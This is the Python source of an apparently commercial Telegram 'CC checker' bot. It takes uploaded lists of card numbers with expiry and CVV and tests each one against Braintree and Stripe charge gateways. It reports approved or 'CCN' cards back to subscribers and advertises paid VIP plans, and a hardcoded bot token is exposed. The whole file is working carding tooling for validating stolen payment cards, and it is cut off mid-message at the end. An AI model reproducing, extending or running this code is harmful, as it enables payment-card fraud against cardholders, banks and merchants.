import telebot,os
import tele
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gatet import *
from file import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from bs4 import BeautifulSoup
stopuser = {}
token = '7291084434:AAFottIkfenkrgbsB9UbrtoBZFo294fqpIk'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin=2134456129
command_usage = {}
def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}	
@bot.message_handler(commands=["start"])
def start(message):
	def my_function():
		gate=''
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
		if BL == '𝗙𝗥𝗘𝗘':	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/mero_221")
			keyboard.add(contact_button)
			random_number = random.randint(33, 82)
			photo_url = f'https://t.me/hftro/366'
			bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 25 ج
3 ايام = 70 ج
اسبوع = 120 ج 
شهر = 450 ج
----------------------------------
طرق الدفع :-

فودافون كاش:
+201066232052

قم بالدفع اولا ثم تواصل مع المطور لتاكيد الدفع واختيار اشتراك
━━━━━━━━━━━━━━━━━
Good luck
『@Mero_221』</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/mero_221")
		keyboard.add(contact_button)
		username = message.from_user.first_name
		random_number = random.randint(33, 82)
		photo_url = f'https://t.me/hftro/366'
		bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["cmds"])
def start(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='𝗙𝗥𝗘𝗘'
	name = message.from_user.first_name
	keyboard = types.InlineKeyboardMarkup()
	contact_button = types.InlineKeyboardButton(text=f"✨ {BL}  ✨",callback_data='plan')
	keyboard.add(contact_button)
	bot.send_message(chat_id=message.chat.id, text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝗦 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

✅𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵 <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 

✅𝟯𝗗 𝗟𝗢𝗢𝗞𝗨𝗣 <code>/vbv </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗢𝗡𝗟𝗜𝗡𝗘

✅ 𝐒𝐓𝐑𝐈𝐏𝐄 𝐀𝐔𝐓𝐇 <code>/st </code>

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>
''',reply_markup=keyboard)
@bot.message_handler(content_types=["document"])
def main(message):
		name = message.from_user.first_name
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)]['plan'])
		except:
			BL='𝗙𝗥𝗘𝗘'
		if BL == '𝗙𝗥𝗘𝗘':
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				id : {
	  "plan": "𝗙𝗥𝗘𝗘",
	  "timer": "none",
				}
			}
	
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/mero_221")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 25 ج
3 ايام = 70 ج
اسبوع = 120 ج 
شهر = 450 ج
----------------------------------
طرق الدفع :-

فودافون كاش:
+201066232052

قم بالدفع اولا ثم تواصل مع المطور لتاكيد الدفع واختيار اشتراك
━━━━━━━━━━━━━━━━━
Good luck
『@Mero_221』</b>
''',reply_markup=keyboard)
			return
		with open('data.json', 'r') as file:
			json_data = json.load(file)
			date_str=json_data[str(id)]['timer'].split('.')[0]
		try:
			provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		except Exception as e:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/mero_221")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
يوم = 25 ج
3 ايام = 70 ج
اسبوع = 120 ج 
شهر = 450 ج
----------------------------------
طرق الدفع :-

فودافون كاش:
+201066232052

قم بالدفع اولا ثم تواصل مع المطور لتاكيد الدفع واختيار اشتراك
━━━━━━━━━━━━━━━━━
Good luck
『@Mero_221』</b>
''',reply_markup=keyboard)
			return
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/mero_221")
			keyboard.add(contact_button)
			bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
		''',reply_markup=keyboard)
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"🏴‍☠️ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 ♻️",callback_data='br')
		sw = types.InlineKeyboardButton(text=f" 𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 🔥",callback_data='sq')
		keyboard.add(contact_button)
		keyboard.add(sw)
		bot.reply_to(message, text=f'𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚',reply_markup=keyboard)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("combo.txt", "wb") as w:
			w.write(ee)
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝘼𝙪𝙩𝙝'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜『@Mero_221』')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 🎭 ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 💣 ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮『@Mero_221』''', reply_markup=mes)

					msgc=f'''<b>𝑪𝑪𝑵  ☑️ 
					
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@Mero_221』</b>'''
					
					msg=f'''<b>🟢  𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱
			
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
					
					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
					elif 'CVV' in last:
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(15)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜『@Mero_221』')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'sq')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝘼𝙪𝙩𝙝 2'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜『@Mero_221』')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
					except:
						pass
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(st(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 🎭 ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 💣 ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮『@Mero_221』''', reply_markup=mes)
					
					msgc=f'''<b>𝘾𝙃𝘼𝙍𝙂𝙀 5$ ✅
			
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
					
					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
					elif 'Charged' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'CVV' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(15)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜『@Mero_221』')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	 if message.chat.username != 'ccmero':
	        return
	 gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 '
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 5:
	   bot.reply_to(message, f"<b>Try again after {5-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(Tele(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
	   
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
	     
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
	   
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
[↯] 𝐕𝐁𝐕 ⇾ {vbv(cc)}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.st') or message.text.lower().startswith('/st'))
def respond_to_vbv(message):
	 if message.chat.username != 'ccmero':
	        return
	 gate='𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 🔥'
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 15:
	   bot.reply_to(message, f"<b>Try again after {15-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(st(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[↯] 𝗕𝗮𝗻𝗸  → {bank}
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@Mero_221』</b>'''
					
	 msgc=f'''<b>𝘾𝙃𝘼𝙍𝙂𝙀 ✅
			
[↯] 𝗖𝗖 ⇾<code>{cc}</code>
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
